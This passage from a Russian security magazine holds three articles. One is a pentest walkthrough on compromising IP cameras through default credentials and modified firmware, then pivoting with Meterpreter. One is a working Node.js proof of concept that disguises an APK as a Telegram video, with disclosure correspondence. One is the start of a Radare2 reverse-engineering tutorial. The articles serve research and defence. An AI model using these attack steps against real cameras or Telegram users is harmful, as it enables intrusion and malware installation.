лать побайтово, например с помощью printf. Сгенерировать нагрузку мож‐
но примерно так:


cat bind | od -An -t o1 -v | tr ' ' '/' | while read line
do echo "printf '$line' >> out.bin" | tr '/' '\'
done

Здесь стоит сказать большое спасибо моему коллеге S0i37 за то, что помог
все это автоматизировать.
   После того как скрипт отработал, копируем его вывод и вставляем
на камере. В результате у нас получится готовый к использованию исполня‐
емый файл.





      Перекидываем полезную нагрузку и даем ей права на исполнение

Залитому файлу не забываем дать права на исполнение и пробуем запустить.
Действительно — все сработало. Своей цели мы достигли: снова получили
RCE на камере. А как сделать прокси, ты уже знаешь.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
         IP-КАМЕРЫ
       НА ПЕНТЕСТАХ
          ИСПОЛЬЗУЕМ ВИДЕОКАМЕРЫ
                  НЕ ПО НАЗНАЧЕНИЮ





КЕЙС 4: МОДИФИКАЦИЯ ПРОШИВКИ

И один из самых интересных кейсов — модификация прошивки. У нас есть
доступ  к  веб‑интерфейсу камеры, но  нет  возможности  включить SSH
или Telnet. Но мы можем обновить на камере прошивку, это и попробуем сде‐
лать.
   Итак, мы получили сетевой доступ к веб‑интерфейсу камеры. По традиции
не забываем сходить в Google и поискать креды по умолчанию.





                 Форма входа в веб‑интерфейс камеры

Креды нашли и заходим в админку. Но возможности включить Telnet или SSH
там нет. Зато мы обращаем внимание на вкладку, в которой нам предлагают
обновить прошивку из файла.





                      Вкладка с обновлением прошивки

Создавать прошивку с нуля — это долгое и сложное занятие. Поэтому мы
можем попробовать взять прошивку от производителя и немного замоддить.
Идем на сайт производителя и находим там подходящий файлик. Качаем
и снова без труда открываем обычным архиватором.
   Обнаруживаем интересный скрипт run.sh. Само название нам намекает
на то, что он выполнится при загрузке камеры. В скрипте есть строчка
telnetd  &, но она закомментирована. Предполагаем, что если ее рас‐
комментировать, то при старте камеры включится Telnet. Давай попробуем!





                            Редактируем скрипт run.sh

Также в прошивке есть файловая система rootfs. В ней — директория /etc,
а там, как водится, файл passwd, в котором снова лежит хеш от учетки root.
Но на этот раз смысла что‑то брутить нет. Мы просто сгенерим такой же хеш,
но от пароля, который мы знаем. Затем заменим хеш и сохраним файл.
   Генерируем хеш:


openssl passwd -1 password



                   Делаем хеш для замены в прошивке





                       Меняем файл /etc/passwd

После этих манипуляций мы почти готовы перезаливать прошивку. Неужели
все так просто? Да, почти. Стоит лишь учесть тип файловой системы, исполь‐
зуемый в прошивке. В нашем случае это cramfs. Распаковать ее действитель‐
но  можно  обычным  архиватором, но  вот  запаковать уже  так  просто
не получится. Для этого нам надо установить окружение и выполнить такую
команду:


mkcramfs romfs romfs-x.cramfs


           WARNING

                            Если  ты  зальешь  неправильную   прошивку,
                       камера, скорее всего, превратится в «кирпич» и в
                         реальном  пентесте  ты  больше  не  сможешь
                        получить к ней доступ.


Вот теперь мы уже точно готовы к прошивке камеры.





                             Заливаем прошивку

Жмем кнопку «Прошивка», и камера перестает отвечать на пинги и вообще
не подает никаких признаков жизни.





Но спустя минуту она снова появляется, и мы можем наконец выдохнуть.
Смотрим, поднялся ли наш Telnet. Да, он работает, и мы можем подключиться
к нему с паролем, который внесли в /etc/passwd.





                Успешное подключение к камере по Telnet

На этот раз нам доступен Netcat.





                      Обнаружение Netcat на камере

С помощью Netcat мы легко перенесем любую нагрузку и сможем запустить
ее. Например, Meterpreter, который мы сгенерировали ранее.
   После того как у нас снова залит и запущен C2-агент на камере, можно
запускать прокси. На этот раз всего в несколько команд:


run autoroute -s 10.0.0.0/8
background
use auxiliary/server/socks_proxy
run

После этого мы получим полноценное проксирование через камеру, а также
удобный контроль над ней в виде C2-агента.
   Итак, мы захватили уже четыре камеры и можем подвести промежуточный
итог. Мы увидели, как быстро и просто можно использовать камеру в пен‐
тестерском ремесле, получать на ней RCE и выполнять пивотинг. Такие кейсы
вполне можно реализовать на реальном проекте за небольшое время.
Потенциально они могут послужить точкой закрепления либо точкой прок‐
сирования трафика.
   Кстати, искать камеры достаточно просто — по сочетанию открытых TCP-
портов 80 и 554.
  В продолжение этой темы могу порекомендовать ознакомиться с док‐
ладом Dahua про камеры. Доклад настолько жесткий, что начинается со слов
«выпаяем память, чтобы получить прошивку».


ДЛЯ ЗАЩИТНИКОВ

Наверное, ты уже заметил, что все кейсы начинались с того, что на камере
установлен пароль по умолчанию. А кейсы с прошивками были связаны
с захардкоженными паролями. Исходя из этого, для защиты камер рекомен‐
дую:
 • меняй дефолтные пароли, это прикроет почти все возможные векторы экс‐
   плуатации;
 • обновляй софт, производители зачастую выпускают обновления безопас‐
   ности;
 • обновляй железо, иногда так бывает, что устройство перестает поддержи‐
    ваться, в таком случае стоит заменять его более актуальным;
 • рекомендуй начальству проводить пентесты, чтобы обнаруживать подоб‐
  ные недостатки в своих инфраструктурах и вовремя принимать меры;
 • изолируй сегмент камер от основной инфраструктуры.

Иногда бывает, что камеры находятся не в ведомстве ИТ- или ИБ‑отделов, а в
ведомстве отдела безопасности (охраны). В таком случае влиять на обновле‐
ние камер со стороны ИБ очень тяжело. Могу только порекомендовать ста‐
раться изолировать сегменты сети, на обновления которых твоя команда
не может влиять.


ВЫВОДЫ

В этой статье я хотел на реальных примерах показать, что камеры вполне
можно использовать для проведения сложных атак в инфраструктурах. Понят‐
но, что мы рассмотрели не все возможные случаи, и в каждой ситуации тебе
придется самому додумывать и  докручивать, но ты уже будешь знать
о методах, которые стоит попробовать в первую очередь. Возможно, у тебя
получится реализовать нечто новое и более крутое, тогда будем ждать твоих
публикаций и ресерчей!
ВЗЛОМ





Недавно мне на глаза попался пост при‐
мерно  такого  содержания: «В  Telegram
выявлена  новая  уязвимость,  связанная
с загрузкой видеороликов». К посту при‐
лагалась   демонстрация:   пользователь          Антон Шустиков                                                                                          Консультант по FinTech,
получает  видео, при  тапе по  которому               крипто, ИБ                                                                                   @CakesCats_com
Telegram  пытается  установить  стороннее
приложение. При этом проблема не прив‐
лекла  особенного  внимания. Я  решил
разобраться,    работает   ли    способ,
и написать к нему эксплоит.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ

Для начала детально разберем, что происходит на видео, которое демонс‐
трирует работу бага.
   Вначале мы видим командную строку, где атакующий вводит параметры
бота и отправки: токен бота, ID чата, путь до файла APK для загрузки и путь
к картинке (preview). Также предлагается ввести сообщение и скрыть его
как спойлер. Все ключи и ID на видео замазаны.





После ввода параметров атакующий видит подтверждение удачной отправки.
Атакуемый же получает сообщение, которое выглядит как обычный виде‐
офайл.





При нажатии на него появляется сообщение, что видеофайл не может быть
воспроизведен и необходим дополнительный плеер. Если пользователь дает
согласие, происходит инсталляция самого присланного файла при помощи
стандартного инструмента для установки APK в Android.
   Далее пользователь видит стандартные запросы, которые приложения
делают при установке: предоставить права на доступ к контактам, микрофону
и так далее. Сами запросы зависят от модели телефона, версии Android
и того, что захочет заполучить разработчик.
   Ну а в конце в видео показан «отстук» в панель управления трояном и воз‐
можность доступа к приватным данным и удаленного управления смартфо‐
ном. Также по видео мы можем косвенно подтвердить, что автор из Турции,
так как в панели фигурирует эта страна, а IP рядом указан локальный.


ONE-TAP EXPLOIT

Итак, перед нами one-tap exploit (или one-click exploit) — эксплоит одним кли‐
ком или тапом. Это тип уязвимости, который позволяет злоумышленнику
получить контроль над устройством или аккаунтом жертвы, если та сделает
всего одно нажатие. Эти эксплоиты менее опасны, чем, скажем, RCE, пос‐
кольку требуют хоть и минимального, но все же действия со стороны поль‐
зователя:  обычно  достаточно  просто  кликнуть на  вредоносную  ссылку.
Хороший общеизвестный пример такой уязвимости — XSS.
  Тем временем я крепко задумался, как же работает найденный баг и как
его можно воспроизвести.


КАК УСТРОЕНА УЯЗВИМОСТЬ

Я пересмотрел видео и попытался собрать максимум информации. Может
быть, важны какие‑то детали или вдруг попадутся рабочие куски кода? Вни‐
мательно  наблюдаем  за  процессом  подготовки:  указывается  картинка
для видео, указывается сам файл, который должен быть установлен, ID бота
и TGID жертвы.
  Из  всего  перечисленного  следует,  что  достаточно передать любой
файл, — главное, чтобы клиент Telegram признал, что это видео. «Значит,
проблема кроется в отправке файлов!» — решил я и погрузился в изучение
API Telegram, а точнее — той части, где мы отправляем файлы. Особое вни‐
мание, конечно, уделяем видео.





Вроде бы все в порядке: API как API. Но мой взгляд цепляется за непримет‐
ное поле thumbnail, в котором и передают картинку для видео. Как мы пом‐
ним, на видео как раз прикрепляли картинку. Вряд ли это совпадение.
Зачем‑то ведь еще передается и mime type... В функции отправки видео мы
почему‑то должны сообщать, что отправляем видео. Подозрительно!


Что такое MIME
MIME-тип (Multipurpose Internet Mail Extensions) — это стандарт, исполь‐
зуемый для описания типа содержимого различных файлов, передаваемых
по  сети.  Первоначально  он  разрабатывался  для  электронной  почты,
но теперь MIME-типы применяются в различных интернет‑протоколах, вклю‐
чая HTTP, чтобы указать тип передаваемого контента.
   MIME-тип состоит из двух частей: основного типа и подтипа, разделенных
косой чертой (например, type/subtype).
   Примеры некоторых распространенных MIME-типов:
 • text/plain — обычный текстовый файл;
 • text/html — HTML-документ;
 • image/jpeg — изображение в формате JPEG;
 • application/json — данные в формате JSON;
 • application/pdf — документ в формате PDF.

MIME-типы указывают, как следует интерпретировать передаваемый контент,
чем помогают программам корректно обрабатывать и отображать файлы.



Если мы сообщаем, что тип — «видео», значит, мы можем при этом отправить
не видео? И если так, то мы, вероятно, получим поведение, которое видели
в ролике с демонстрацией: Telegram попробует запустить наше «не видео»,
у него ничего не получится, и он захочет установить «видеоплеер» для этого
типа  файлов.  Все  складывается,  кроме  одного  момента:  непонятно,
как передать этот самый подходящий видеоплеер для установки. Ну или,
говоря языком безопасности, «нагрузку». Пока не все понятно, однако мы
явно на верном пути.
   Такие были мои размышления в тот момент. И конечно, руки горели вос‐
произвести уязвимость самостоятельно.


ПИШЕМ POC

Proof of Concept (PoC) — это, если мы говорим про безопасность, демонс‐
трация возможности проэксплуатировать уязвимость. PoC показывает, что
баг реален и злоумышленник может его использовать в своих целях.
   У нас уже достаточно вводных данных, чтобы проверить гипотезу, поэтому
приступим к кодингу.
   Первым шагом нужно сделать бота при помощи BotFather и получить
токен. Сделать это элементарно:
 • стучимся к @BotFather;
 • выполняем по очереди команды /start и /newbot;
 • вводим данные, которые у нас запрашивает бот‑отец (имя нового бота
   и прочее);
 • пройдя «квиз», получаем botTokenTG нового бота.





Далее набрасываем на Node.js простейший код, который будет отправлять
видео. И конечно, применяем обнаруженные нами странные параметры. Поп‐
робуем отправить файл APK, но с MIME-типом MP4. В третьей строчке встав‐
ляем токен, полученный от BotFather.


const fs = require("fs");
const TelegramBot = require("node-telegram-bot-api");
const token = "botTokenTG";
const bot = new TelegramBot(token, { polling: true });


bot.onText( /\/video/, ( msg) => {
  const chatId = msg.chat.id;
  bot.sendVideo(
    chatId,
    fs.readFileSync("/путь/к/файлу.apk") ,
    {
      width: 300,
      height: 300,
      duration: 30,
    } , {
      filename: "VIDEO.apk" ,
      contentType: "video/mp4"
    }
  );
});

Здесь /video — это команда, которую наш бот будет ждать, чтобы ответить
«эксплоитом».
   Выбираем APK (я тупо сделал touch VIDEO.apk, чтобы создать его) и ука‐
зываем путь к файлу, который хотим отправить или запустить.
   Запускаем демон бота и передаем ему команду /video. В ответ он нам
возвращает сообщение с нашим APK под личиной video.
    Результат — на скриншотах ниже. Пустой файл отображается как белый
квадрат, на который можно нажать.





Тапаем, чтобы посмотреть, что же случится.





Офигеть! Нам предлагают установить приложение! И что же будет, если
нажать «Открыть»? В таком случае Telegram зачем‑то пытается установить
присланный ему файл. Нагрузка и есть тот файл, который мы прислали. Фан‐
тастика!
   Как? Зачем? Почему? Скажу сразу, это для меня так и осталось загадкой:
Telegram зачем‑то пытается устанавливать файл плеером для самого себя. То
есть  прислали файл  «ромашка.avi» и  для  просмотра  Telegram может
попытаться открыть его в «ромашка.avi». К автору такого кода множество воп‐
росов (в том числе, где он берет наркотики), но для нас важно, что эксплоит
работает.


ОБЩЕНИЕ С TELEGRAM

Я, как белый ресечер (и даже более того — автор книги по цифровой
безопасности, филантроп и, даст бог, миллионер), конечно же, посчитал сво‐
им долгом известить команду безопасности телеги. Благо с этим у них все
в  порядке  и  первый  же  заход  в  Google  привел  меня  к  адресу
security@telegram.org.





Отличная новость! Мы на этом сможем еще и заработать пару десятков веч‐
нозеленых, ведь эта проблема по масштабам вторая после недавней связан‐
ной с опечаткой в расширении файла. «Вдруг на какую‑нибудь подержанную
видеокарту хватит, это ж можно будет с ИИ играться!» — подумал я ненаро‐
ком.
  С воодушевлением пишу письмо в Telegram, прилагаю черновик этой
статьи и эксплоит, который мы сделали выше. Отправляю и жду... Через пару
дней вижу, что поведение клиента изменили: теперь файл прилетает просто
как APK без картинки. Еще через пару дней получаю ответ, он ниже на скрине.





Облом: представители Telegram ответили, что баг пофиксили еще до моего
репорта и приняли какие‑то меры на бэкенде. И всё. Никаких благодарностей
и почетных грамот, не говоря уже про кружку сока. «Мы всё пофиксили
еще 9 июля, будьте здоровы!» Ну только без пожелания здоровья.
   Что ж, говорите что хотите, а я наблюдал баг после 9 июля. С другой сто‐
роны, авторство я присвоить себе действительно не могу, хоть видеокарта бы
и не помешала. Так что остается только вспомнить анекдот про мужика,
которому всё пофиг.
   Думаю, заявления о том, что всё исправили в тот же день, делаются прос‐
то для поддержания репутации. Ну а проблема «кто‑то сдал баг раньше»
бывает даже на проектах, в которых ты действительно нашел уязвимость сам,
а тут я только заприметил ее в публичном блоге.
   Как выяснилось позже, в продаже эксплоит появился месяцем раньше,
6 июня, на площадке с открытой регистрацией. Так что вряд ли и этот день
можно  считать днем открытия  эксплоита, ведь кто‑то к  этому времени
не только сделал PoC, но и собрал продукт на продажу.





От редакции: переписка с Telegram
В тех случаях, когда автор говорит одно, а представители компании — дру‐
гое, дело редакции — направить официальный запрос и привести доводы
другой стороны. Нам повезло: представитель Telegram сам обратился к нам,
отреагировав на недавнюю публикацию. О том же баге, что описан в этой
статье, сообщила компания ESET, и новость об этом вышла на «Хакере»
23 июля.
  Нам написал Реми Вон и представился сотрудником Telegram. Дальше
перевод его писем и моего ответа с английского:

          Хочу обратиться к вам по поводу вашей статьи, прошу вклю-
      чить в нее следующее заявление.
        Этот эксплоит не является уязвимостью в Telegram. Он тре-
      бует,  чтобы пользователь открыл видео, поменял  настройки
      безопасности  Android и  вручную  установил  подозрительное
      «медиаприложение».
      Мы получили отчет об этом  эксплоите 5 июля и сделали
      изменения на стороне сервера 9 июля, чтобы защитить поль-
      зователей всех версий Telegram.


Чем я и воспользовался, чтобы задать вопрос про нестыковки по времени.

       Не вижу никаких проблем с нашей новостью, поскольку экс-
      плоиты одним кликом опасны и эффективны, а также задоку-
      ментированы  как T1658  по  MITRE.  Клиентское  приложение
      Telegram проявляло неожиданное для пользователя поведение,
      что  представляло  угрозу.  Допустимость  такого  поведения
     и называется уязвимостью. Это подтверждает отчет ESET, а так-
     же сам факт того, что ваши инженеры опознали и быстро устра-
     нили проблему.
         Более интересен другой вопрос: у нас есть свидетель того,
      что атака была по‑прежнему возможна и 11 июля, и позже —
      вплоть до 15 июля. Не могли бы вы помочь прояснить эту ситу-
     ацию?


На что получил следующий ответ.

       Это  никогда не было  уязвимостью  типа  one-click.  Поль-
      зователь должен был предпринять несколько шагов, прежде чем
      стать жертвой атаки. Telegram, может быть, и скачивал файлы
       автоматически, но пользователям тем не менее нужно было
      разрешить установку APK-пакетов, открыть файл и подтвердить
       установку.
         Копии файла, отправленные до серверного апдейта 9 июля,
      продолжали  отображаться  как видео. Это было  исправлено
      в появившемся вскоре апдейте приложения.


Нам здесь остается только пожать плечами:
 • Настойчивые  заявления о  том,  что  уязвимость  пофиксили 9  июля,
   по‑прежнему звучат сомнительно. Автор статьи настаивает, что узнал
  об уязвимости 10 июля, и приводит скриншоты, где эксплуатация происхо‐
   дит 11 июля — с совершенно новым файлом. Какой‑то серверный фикс,
  может быть, и имел место, но его эффективность под вопросом. В таком
   случае, рассуждая о копиях файла, господин Вон здесь выдает желаемое
   за действительное.
 • Уязвимости часто подразумевают условия для эксплуатации и от этого
   не перестают быть уязвимостями. Да и разрешение на установку APK —
   никакая не редкость. Так что, несмотря на протесты со стороны Telegram,
   это, на наш взгляд, вполне можно считать багом one-click.

— Андрей Письменный



ВЫВОДЫ

На мой взгляд, соблазн торговать такими багами в даркнете как раз таки дол‐
жен пропадать благодаря программам  багбаунти, а если они работают
кое‑как и с неохотой, то и сдавать баги будут так же. Пользуясь случаем,
рекомендую использовать для безопасной переписки Jabber и Tox. Что
до Telegram, то я рад, если получилось сделать и его (а следовательно, и мир)
чуточку безопаснее.
   Впрочем, сильно ли? Присланные APK после фикса больше нельзя мас‐
кировать под видео, но присылать по‑прежнему можно. При клике на них
Android по‑прежнему будет предлагать установку (если она разрешена в нас‐
тройках) или советовать включить возможность установки APK. Если сделать
файл маленьким, то клиент еще и автоматически скачает его, что сократит
лишний шаг атаки. Поиграв с именем файла, оттеняющим расширение, зло‐
умышленник сможет еще больше повысить свои шанс на успех. Так что пол‐
ностью хоронить этот вектор атаки пока что рановато.
ВЗЛОМ





Если ты никогда не пользовался Radare2, то
наверняка о нем слышал: это опенсорсный
набор  инструментов  для  исследования
программ. В него входит мощный дизас‐
семблер и  отладчик,  позволяющий  пог‐     Юрий "yurembo" Язев                                                                                    Программист, разработчик
рузиться в систему глубже, чем стандар‐        видеоигр, независимый                                                                                            исследователь
тный GDB. В этой статье мы подробно                 t2d-dev.ru
поговорим о философии Radare2 и начнем
работать с ним.


В статье «Отладка программ без исходников. Анализируем двоичные файлы
в Linux штатными средствами» мы рассмотрели базовые средства дизассем‐
блирования и отладки приложений в Unix-подобных операционных системах,
настолько старых, что ими пользовались еще динозавры. С другой стороны,
уже в XXI веке были созданы альтернативные инструменты, благодаря своему
удобству и мощи завоевавшие любовь трудящихся на ниве информационной
(без)опасности специалистов.


RADARE2

Как известно, Radare2 представляет собой глобально измененный форк пер‐
вого Radare. В соответствии с законами мира Unix это набор узкоспециали‐
зированных утилит командной строки. Их можно применять как порознь, так
и вместе: одна утилита использует результаты работы другой.
  В набор входит более десятка утилит. Вот некоторые из них:
 • Radare2 — собственно главная тулза, она способна открывать большое
   количество разных источников ввода‑вывода подобно обычным файлам:
   диски, сетевые соединения, драйверы, процессы под отладкой. Позволяет
   при помощи командной строки перемещаться по файлу и заниматься
   дизассемблированием, поиском, анализом, изменением и сравнением
   данных с возможностью визуализации. Любой процесс поддается скрип‐
   тингу на многих языках, среди которых JavaScript, Ruby, Python и Lua.
 • Rax2 — анализатор выражений. Умеет делать базовые преобразования
   между разными форматами: строками, значениями с плавающей запятой,
   шестнадцатеричными числами и прочими. Также поддерживает изме‐
   нение порядка следования байтов.
 • Rafind2 — позволяет воспользоваться библиотекой r_search для поис‐
   ка строк или байтов по маске.
 • Rabin2 — показывает всю информацию о двоичном файле: сведения
  о секциях, заголовках, импортированных данных и прочее. Понимает мно‐
   го форматов исполняемых файлов: PE, ELF, Mach-O, Java и  другие.
  С помощью  плагинов  этот  список  можно  расширить,  после  чего
   Rabin2 будет отображать символы импорта и экспорта, библиотечные
   зависимости, строки, адреса точек входа и тип архитектуры.
 • Rarun2 — позволяет настроить среду для выполнения или отладки при‐
   ложений. Позволяет менять настройки окружения, не затрагивая работу
  ОС. Особенно часто используется для переопределения потока вывода
   отлаживаемой с помощью Radare2 программы.
 • Rasm2 — встроенный ассемблер/дизассемблер. Первоначально инстру‐
   мент был разработан для внесения изменений в бинарные файлы. Его
   основная функция — получить байты, соответствующие заданному опкоду
   машинной инструкции. Rasm2 поддерживает плагины, что позволяет ему
   работать с файлами для разных архитектур.
 • Radiff2 — тулза для сравнения двоичных файлов, подобно тому, как это
   делает diff с текстовыми файлами. Radiff2 использует разные алгоритмы
   для поиска и сравнения содержимого файлов.
 • Ragg2 — компилирует программы, написанные на собственном языке
   высокого  уровня, в  крошечные бинарники для  архитектур  x86, x86-
   64 и ARM. Позволяет организовать базовый блок для создания переме‐
  щаемых фрагментов кода, которые будут использоваться для внедрения
   в целевые процессы при эксплуатации. Хотя по умолчанию Ragg2 ком‐
   пилирует свой собственный язык Ragg2, также можно скомпилировать код
   на языке C, используя шелл‑коды GCC или Clang.
 • Rahash2 — c помощью большого числа алгоритмов подсчитывает кон‐
   трольную сумму любых файлов, дисков или строк. Тулза также способна
   кодировать и декодировать данные, используя простые операции, такие
   как Base64, XOR и прочие.
 • Rodeco — написанный на Rust декомпилятор с ассемблера, получаемого
   от Rasm2, на псевдо-C. К сожалению, до сих пор нежизнеспособен:
   результаты его работы крайне скромные. Поэтому утилита не включена
   в стандартную поставку фреймворка.

Так как Radare2 — Unix-ориентированный фреймворк, все утилиты в базовом
варианте  исполняются в командной  строке.  Однако с Radare2 можно
работать не только в консольной среде: к услугам хакера есть несколько гра‐
фических оболочек, объединяющих все инструменты фреймворка в мощную
интерактивную  среду.  Среди них  особую  популярность  завоевали  iaito
и Сutter. Они очень похожи, поскольку второй — форк первого.
   Инструменты, входящие в Radare2, можно использовать в самых разных
ОС и исследовать код для разных процессорных архитектур. Поддерживают‐
ся x86-64, ARM, MIPS, PowerPC, SPARC, Z80, MOS 6502 и байт‑код разных
виртуальных машин. Анализировать можно PE32, PE32+, ELF, ROM-файлы
игровых приставок и многое другое.
    Хотя сами утилиты Radare2 где только не работают, интерактивные среды
поддерживаются лишь в основных десктопных ОС. Однако даже консольные
утилиты Radare2 удобны в работе, если ты умеешь с ними обращаться. Также
управлять Radare2 можно из веб‑оболочки.
   Изучив основные сведения, переходим к практике, а точнее — к установке.


УСТАНОВКА

В отличие от прошлой статьи, где я использовал Ubuntu, организовывать
эксперименты сегодня я буду в Debian Linux.
   Перед установкой Radare2 в Debian мне потребовалось установить gnu
make, по умолчанию его в дистрибутиве не было. Лучше сразу установить
build-essential:


sudo apt-get install build-essential

Хотя многие дистрибутивы Linux содержат готовые к инсталляции пакеты
Radare2, версия из менеджера пакетов может быть не самой новой, поэтому
можешь скачать последнюю версию с GitHub (заметим, что и обновлять
в таком случае дальше придется вручную):


git clone https://github.com/radareorg/radare2.git

Запустим установку:


cd radare2
sudo sys/install.sh

Внутри подкаталога binr находятся подпапки со всеми перечисленными
выше утилитами.





                      Содержимое подкаталога binr

Заодно установим vim, если его нет в системе:


sudo apt install vim

Хотя, если предпочитаешь nano или другой редактор, ты волен ставить, что
тебе больше нравится.


ОБЪЕКТ АНАЛИЗА

Итак, представим, что наш Linux находится в далекой‑предалекой галактике
и нам, героям, нужно взломать сервак злодея‑работорговца Джаббы Хатта.
Программа на этом сервере написана на C, потому что Джабба предпочитает
олдскул.
  Я предлагаю тебе скачать исходный код и, не изучая его, чтобы не подгля‐
дывать в разгадку, сразу скомпилировать. Первым делом клонируй репози‐
торий с моего GitHub. Далее компилируй сервер для 64-битной платформы,
так как этот вариант для нас явно интереснее.
   Находясь в  каталоге с исходником нашего сервера, выполним ком‐
пиляцию и сборку:


gcc server.c -o server64.elf

На выходе получаем исполняемый ELF-файл, над которым мы будем работать
на протяжении статьи.


ЗАПУСК

Мы не знаем, что делает утянутый у Джаббы исполняемый файл, поэтому вна‐
чале просто запустим его и посмотрим. Неизвестные файлы лучше всего
выполнять в изолированной среде, ведь в реальной жизни что только не при‐
ходится отлаживать. Поэтому я работаю в виртуальной машине, которая
не содержит никаких ценных данных, что рекомендую и тебе.
   Итак, из каталога HackThisServer запустим наш сервер:


./server64.elf

Ничего видимого не происходит: вероятно, программа ждет обращения.
  В качестве клиента для подключения к запущенному серверу восполь‐
зуемся утилитой netcat, задав в параметрах адрес целевой машины и номер
порта. В другом окне терминала введи (номер порта мы узнаем чуть позже,
пока прими данный по умолчанию):


nc localhost 14884

В результате нас встретит экран авторизации.





                      Система канализации Джаббы

Попробуем ввести xakep. Сервер ответит: «These are not the droids you are
looking for!» При этом сеанс netcat будет завершен.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   RADARE2 С САМОГО
            НАЧАЛА
              УЧИМСЯ ИСПОЛЬЗОВАТЬ
        ОПЕНСОРСНЫЙ ФРЕЙМВОРК ДЛЯ
         АНАЛИЗА ПРИЛОЖЕНИЯ В LINUX





ИССЛЕДОВАНИЕ: СТАТИЧЕСКИЙ АНАЛИЗ

Использование Radare2 из командной строки похоже на работу с отладчиком
GDB. Чтобы лучше усвоить команды R2, предлагаю первое время исполь‐
зовать именно консольный вариант, не прибегая к помощи визуальных обо‐
лочек. Давай посмотрим, как из командной строки проводить статическое
исследование и динамический анализ бинарника.


Этап первый — подготовительный
Оставаясь в каталоге с ELF-файлом, натравим на него дизассемблер:


r2 server64.elf

Все последующие команды будут выполняться над указанным файлом, поэто‐
му его имя больше вводить не понадобится.
  В приглашении для ввода Radare2 показывает адрес точки входа прог‐
раммы.
   Запустим процедуру анализа:


aaa

В процессе анализа Radare2 выявляет точку входа, импортированные фун‐
кции, пытается определить вызовы функций, их параметры, восстанавливает
переменные.  Если  приложение  написано  на  ООП‑языках,  определяет
методы, а если на C++, находит и парсит таблицу виртуальных функций. IDA
Pro запускает подобную процедуру анализа  автоматически  сразу после
открытия файла.





                        Radare2 после анализа

В начале анализа хорошим решением будет посмотреть на список импорти‐
рованных функций, так мы сможем понять, чем вообще занимается приложе‐
ние:


ii





                     Список импортированных функций

Из полученной информации можно сделать вывод: приложение работает
со строками, файлами, потоками ввода‑вывода и сокетами. Собственно, воз‐
можности практически любого серверного приложения.
  К слову, о командах. R2 предлагает свою справочную систему по каждой
команде в духе справки man. Достаточно ввести первую букву команды, затем
знак вопроса, и ты получишь список всех команд, начинающихся с введенной
буквы, а к каждой — краткое описание действий.
   Чтобы получить все параметры файла, надо выполнить команду i.





                   Развернутый список параметров файла

Кроме того, в начале анализа нам необходимо узнать, какие строки содержит
бинарник, ведь вполне возможно, что среди них притаился желаемый пароль.
   Команда iz показывает читаемые строки, находящиеся в секции .data.
А команда izz выводит строки во всем бинарнике. Как мы знаем, прог‐
раммист может запросто создать свою нестандартную секцию и запихнуть
пароль в нее (см. «Фундаментальные основы хакерства»).





                            Вывод команды izz

Если приглядеться, кроме адресов, в выводе указаны названия секции,
кодировка и сама строка.
   Подходящих строк несметное количество. Все равно что искать иголку
в стоге сена. Так что пока ничего интересного найти не удалось.
   Давай выведем список функций в этой программе. Для этого служит
команда afl.





                     Функции, составляющие программу

В выводе есть функции с говорящими названиями: main, authenticate,
check_username, check_password, start_server и другие. Что ж, начнем
с первой.


Этап второй — внутренности защитного механизма
Заглянем для начала в функцию main, чтобы определить, чем программа
занимается, что вызывает, возвращает и так далее. Для этого в R2 есть
команда s (от английского seek — искать). В качестве параметра она может
принимать  адрес, по  которому надо  перейти, или  название  функции,
в которую будет сделан переход. Если посмотришь справку по этой команде,
найдешь еще много других параметров.
   После перехода в строке ввода команды мы обнаружим обновленное сме‐
щение. Это значит, что нужная функция найдена и переход на нее удачно
выполнен. Но простого перехода мало, нам надо посмотреть результат
дизассемблирования этой функции, для чего служит команда pdf. Если выз‐
вать ее без параметров (как в нашем случае), она отобразит текущую фун‐
кцию — ту, на начальный адрес которой указывает курсор.





                Дизассемблированная функция main в консоли

В начале функции формируется параметр: IP-адрес, переданный пользовате‐
лем в командной строке, или, при отсутствии такового, локальный адрес хос‐
та  (127.0.0.1), который далее через регистр RDI передается в функцию
start_server. Стоп! При чем здесь регистр RDI? Ведь на 64-битной плат‐
форме первый целочисленный параметр передается через регистр RCX?
  Но это относится только к Windows, а в Linux действует другое сог‐
лашение — System V AMD64 ABI. Оно гласит, что первые шесть целочис‐
ленных параметров или указателей передаются в следующих регистрах: RDI,
RSI, RDX, RCX, R8, R9. При этом первые восемь значений с плавающей
запятой передаются в регистрах XMM0 — XMM7. Все остальное, если имеет
место, передается через стек.





                  Дизассемблированная функция start_server

Происходящее в start_server нас не особо волнует, поскольку эта функция
не принимает участия в защитном механизме, а только открывает порт
для прослушивания. Это подтверждает передаваемый ей параметр, содер‐
жащий IP-адрес хоста. Однако нам важно разобраться в ней, чтобы узнать
номер открываемого для прослушивания порта.
   Итак, поверхностно взглянем на кишки этой функции. Аргумент (IP-адрес)
копируется в переменную var_28h, далее создается структура сокета со зна‐
чениями по умолчанию.
   После вызова системной функции sym.imp.socket ее результат — сокет
помещается в переменную socket. Выделяется блок памяти, после чего
вызывается функция sym.imp.inet_addr, которая преобразует переданный
в десятичном формате адрес в четырехкомпонентный IP-адрес, а тот сох‐
раняется в структуру in_addr.
   Далее  происходит вызов sym.imp.htons, эта функция  устанавливает
порядок  преобразования  байтов  хоста  (на  x86-64 обратный  порядок)
в сетевой порядок (прямой). Именно эта функция получает в параметре чис‐
ло 0x3A24. R2 неправильно определил формат аргумента, поставив в ком‐
ментарии знак доллара. Эта функция принимает целочисленный параметр,
преобразуем:


? 0x3A24

Результат можешь наблюдать на скриншоте.





         Значения, соответствующие предложенному набору байтов

В первой строке результата отображается нужное нам число — 14 884, то
есть номер открываемого для прослушивания порта. Все приведенные выше
значения помещаются в структуру сокета, выделенную вначале, а последняя
передается в системную функцию sym.imp.bind. Она связывает локальный
адрес с сокетом. В конце start_server вызывается библиотечная функция
listen, которая открывает сокет для прослушивания входящих сообщений.
На выходе start_server выдает дескриптор сокета.
   После возвращения в main дескриптор сокета помещается в переменную
var_ch. Далее по перекрестной ссылке видно, что начинается тело цикла:


CODE XREF from main @ 0x1a8b(x)

Если проследить, откуда происходит переход на эту строку, окажется, что он
выполняется из самого конца функции оператором безусловного перехода
jmp.
  В следующих четырех строчках происходит подготовка параметров для их
передачи функции accept, полученный ранее дескриптор сокета как раз
и передается в нее. Библиотечная функция accept ожидает подключения
к переданному в параметре сокету и в случае успеха возвращает ненулевое
значение — дескриптор сокета, с которым произошло соединение. Он сох‐
раняется в переменную fildes.
